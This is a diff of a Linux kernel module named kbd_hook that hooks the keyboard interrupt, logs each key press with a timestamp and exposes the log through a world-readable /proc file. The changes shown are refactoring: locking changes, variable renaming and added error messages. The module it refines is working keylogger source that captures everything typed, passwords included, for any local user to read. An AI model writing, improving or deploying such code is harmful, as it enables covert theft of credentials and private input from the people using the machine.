@@ -26,7 +26,7 @@ module_param(buffer_size, uint, 0644);
 
 struct keylog {
   u8 scancode;
-  u64 ts; // timestamp in nanoseconds
+  u64 ts;  // timestamp in nanoseconds
 };
 
 static struct keylog *keylogs;
@@ -55,36 +55,36 @@ static void get_key_name(unsigned int scancode, char *buf) {
     *buf = *(row4 + scancode - 0x2c);
   } else {
     switch (scancode) {
-    case 0x39:
-      snprintf(buf, KEYBUF_SIZE, "SPACE");
-      return;
-    case 0x1C:
-      snprintf(buf, KEYBUF_SIZE, "ENTER");
-      return;
-    case 0x0F:
-      snprintf(buf, KEYBUF_SIZE, "TAB");
-      return;
-    case 0x53:
-      snprintf(buf, KEYBUF_SIZE, "DELETE");
-      return;
-    case 0x47:
-      snprintf(buf, KEYBUF_SIZE, "HOME");
-      return;
-    case 0x4F:
-      snprintf(buf, KEYBUF_SIZE, "END");
-      return;
-    case 0x4B:
-      snprintf(buf, KEYBUF_SIZE, "LEFT");
-      return;
-    case 0x48:
-      snprintf(buf, KEYBUF_SIZE, "UP");
-      return;
-    case 0x50:
-      snprintf(buf, KEYBUF_SIZE, "DOWN");
-      return;
-    case 0x4D:
-      snprintf(buf, KEYBUF_SIZE, "RIGHT");
-      return;
+      case 0x39:
+        snprintf(buf, KEYBUF_SIZE, "SPACE");
+        return;
+      case 0x1C:
+        snprintf(buf, KEYBUF_SIZE, "ENTER");
+        return;
+      case 0x0F:
+        snprintf(buf, KEYBUF_SIZE, "TAB");
+        return;
+      case 0x53:
+        snprintf(buf, KEYBUF_SIZE, "DELETE");
+        return;
+      case 0x47:
+        snprintf(buf, KEYBUF_SIZE, "HOME");
+        return;
+      case 0x4F:
+        snprintf(buf, KEYBUF_SIZE, "END");
+        return;
+      case 0x4B:
+        snprintf(buf, KEYBUF_SIZE, "LEFT");
+        return;
+      case 0x48:
+        snprintf(buf, KEYBUF_SIZE, "UP");
+        return;
+      case 0x50:
+        snprintf(buf, KEYBUF_SIZE, "DOWN");
+        return;
+      case 0x4D:
+        snprintf(buf, KEYBUF_SIZE, "RIGHT");
+        return;
     }
     snprintf(buf, KEYBUF_SIZE, "0x%02x", scancode);
     return;
@@ -97,21 +97,22 @@ static ssize_t kbd_hook_read(struct file *f, char __user *ubuf, size_t len,
   if (*off) {
     return 0;
   }
-  spin_lock_irq(&spinlock);
+  unsigned long flags;
+  spin_lock_irqsave(&spinlock, flags);
 
   if (!keylog_count) {
-    spin_unlock_irq(&spinlock);
+    spin_unlock_irqrestore(&spinlock, flags);
     return 0;
   }
 
   char *kbuf = kmalloc(keylog_count * LOG_ENTRY_SIZE, GFP_ATOMIC);
   if (!kbuf) {
-    spin_unlock_irq(&spinlock);
+    spin_unlock_irqrestore(&spinlock, flags);
     return -ENOMEM;
   }
 
   char keybuf[KEYBUF_SIZE];
-  size_t klen = 0;
+  size_t formatted_len = 0;
 
   for (int i = 0; i < keylog_count; i++) {
     struct keylog *log = &keylogs[i];
@@ -122,29 +123,30 @@ static ssize_t kbd_hook_read(struct file *f, char __user *ubuf, size_t len,
     struct tm tm;
     time64_to_tm(ts.tv_sec, 0, &tm);
 
-    klen += snprintf(kbuf + klen, LOG_ENTRY_SIZE,
-                     "%04ld-%02d-%02d %02d:%02d:%02d.%09ld %s\n",
-                     tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour,
-                     tm.tm_min, tm.tm_sec, ts.tv_nsec, keybuf);
+    formatted_len +=
+        snprintf(kbuf + formatted_len, LOG_ENTRY_SIZE,
+                 "%04ld-%02d-%02d %02d:%02d:%02d.%09ld %s\n", tm.tm_year + 1900,
+                 tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec,
+                 ts.tv_nsec, keybuf);
   }
 
   keylog_count = 0;
 
-  spin_unlock_irq(&spinlock);
+  spin_unlock_irqrestore(&spinlock, flags);
 
-  if (klen > len) {
-    klen = len;
+  if (formatted_len > len) {
+    formatted_len = len;
   }
 
-  if (copy_to_user(ubuf, kbuf, klen)) {
+  if (copy_to_user(ubuf, kbuf, formatted_len)) {
     kfree(kbuf);
     return -EFAULT;
   }
 
   kfree(kbuf);
-  *off = klen;
+  *off = formatted_len;
 
-  return klen;
+  return formatted_len;
 }
 
 static const struct proc_ops kbd_hook_fops = {
@@ -159,9 +161,10 @@ static inline u8 i8042_read_data(void) {
 
 static irqreturn_t kbd_hook_interrupt_handle(int irq_no, void *dev_id) {
   u8 scancode = i8042_read_data();
+  unsigned long interrupt_flags;
 
   if (is_key_press(scancode)) {
-    spin_lock(&spinlock);
+    spin_lock_irqsave(&spinlock, interrupt_flags);
 
     if (keylog_count < buffer_size) {
       keylogs[keylog_count].scancode = scancode;
@@ -169,7 +172,7 @@ static irqreturn_t kbd_hook_interrupt_handle(int irq_no, void *dev_id) {
       keylog_count += 1;
     }
 
-    spin_unlock(&spinlock);
+    spin_unlock_irqrestore(&spinlock, interrupt_flags);
   }
 
   return IRQ_HANDLED;
@@ -183,15 +186,19 @@ static int __init kbd_hook_init(void) {
 
   keylogs = kmalloc_array(buffer_size, sizeof(struct keylog), GFP_KERNEL);
   if (!keylogs) {
+    printk(KERN_ERR "kbd_hook: failed to allocate array for keylogs\n");
     return -ENOMEM;
   }
 
   keylog_count = 0;
 
-  if (request_irq(IRQ_KBD, kbd_hook_interrupt_handle, IRQF_SHARED, MODULE_NAME,
-                  keylogs)) {
+  int ret = request_irq(IRQ_KBD, kbd_hook_interrupt_handle, IRQF_SHARED,
+                        MODULE_NAME, keylogs);
+
+  if (ret) {
+    printk(KERN_ERR "kbd_hook: failed to request irq. Error: %d\n", ret);
     kfree(keylogs);
-    return -EBUSY;
+    return ret;
   }
 
   proc_entry = proc_create(PROCFS_FILE, 0444, NULL, &kbd_hook_fops);
@@ -206,8 +213,7 @@ static int __init kbd_hook_init(void) {
 }
 
 static void __exit kbd_hook_exit(void) {
-  if (proc_entry)
-    proc_remove(proc_entry);
+  if (proc_entry) proc_remove(proc_entry);
 
   free_irq(IRQ_KBD, keylogs);
   kfree(keylogs);
